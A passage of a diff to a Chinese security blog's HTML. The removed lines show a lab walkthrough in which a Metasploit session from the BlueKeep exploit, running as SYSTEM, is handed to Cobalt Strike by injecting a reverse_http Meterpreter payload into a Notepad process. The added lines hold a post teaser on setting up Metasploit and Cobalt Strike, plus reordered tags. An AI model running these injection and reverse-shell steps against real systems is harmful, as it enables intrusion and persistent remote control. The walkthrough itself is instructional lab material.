-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span><span class="token punctuation">:</span><span class="token number">4444</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">60606</span><span class="token punctuation">)</span> at <span class="token number">2020</span><span class="token operator">-</span><span class="token number">09</span><span class="token operator">-</span><span class="token number">30</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token number">51</span> <span class="token operator">+</span><span class="token number">0800</span>                    
-
-meterpreter <span class="token operator">></span> getuid                                                                                                         
-Server username<span class="token punctuation">:</span> NT AUTHORITY\SYSTEM                                                                                         
-meterpreter <span class="token operator">></span>                                                                                                                <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><code>background</code>进入后台</p>
-<p>cs建立一个监听<br><img src="/images/12/7.png" alt><br><img src="/images/12/8.png" alt></p>
-<p>msf使用exploit/windows/local/payload_inject模块</p>
-<pre class="line-numbers language-python"><code class="language-python">msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> No payload configured<span class="token punctuation">,</span> defaulting to windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> set payload windows<span class="token operator">/</span>
-Display all <span class="token number">245</span> possibilities? <span class="token punctuation">(</span>y <span class="token operator">or</span> n<span class="token punctuation">)</span>
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http
-payload <span class="token operator">=</span><span class="token operator">></span> windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> set DisablePayloadHandler true
-DisablePayloadHandler <span class="token operator">=</span><span class="token operator">></span> true
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> set lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span>
-lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span>
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> set lport <span class="token number">8888</span>
-lport <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8888</span>
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> set session <span class="token number">1</span>
-session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>local<span class="token operator">/</span>payload_inject<span class="token punctuation">)</span> <span class="token operator">></span> exploit
-
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Running module against WLSMILE<span class="token operator">-</span>PC
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Spawned Notepad process <span class="token number">5056</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Injecting payload into <span class="token number">5056</span>
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Preparing <span class="token string">'windows/meterpreter/reverse_http'</span> <span class="token keyword">for</span> PID <span class="token number">5056</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/12/9.png" alt></p>
-<p>传递shell成功</p>
-
+    <h1 id="Ubuntu-Metasploit-CobaltStrike4-0"><a href="#Ubuntu-Metasploit-CobaltStrike4-0" class="headerlink" title="Ubuntu + Metasploit + CobaltStrike4.0"></a>Ubuntu + Metasploit + CobaltStrike4.0</h1><p>内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。</p>
+<h2 id="Ubuntu-搭建"><a href="#Ubuntu-搭建" class="headerlink" title="Ubuntu 搭建"></a>Ubuntu 搭建</h2>
+    
+    <a class="article-more-a" href="/2020/09/29/12/#more">more >></a>
+    
     
 
     
@@ -1715,27 +1289,15 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具使用</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1748,6 +1310,18 @@ msf6 exploit<span class="token punctuation">(</span>windows<span class="token op
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql server</a>
               </li>
              
               <li class="article-tag-list-item">
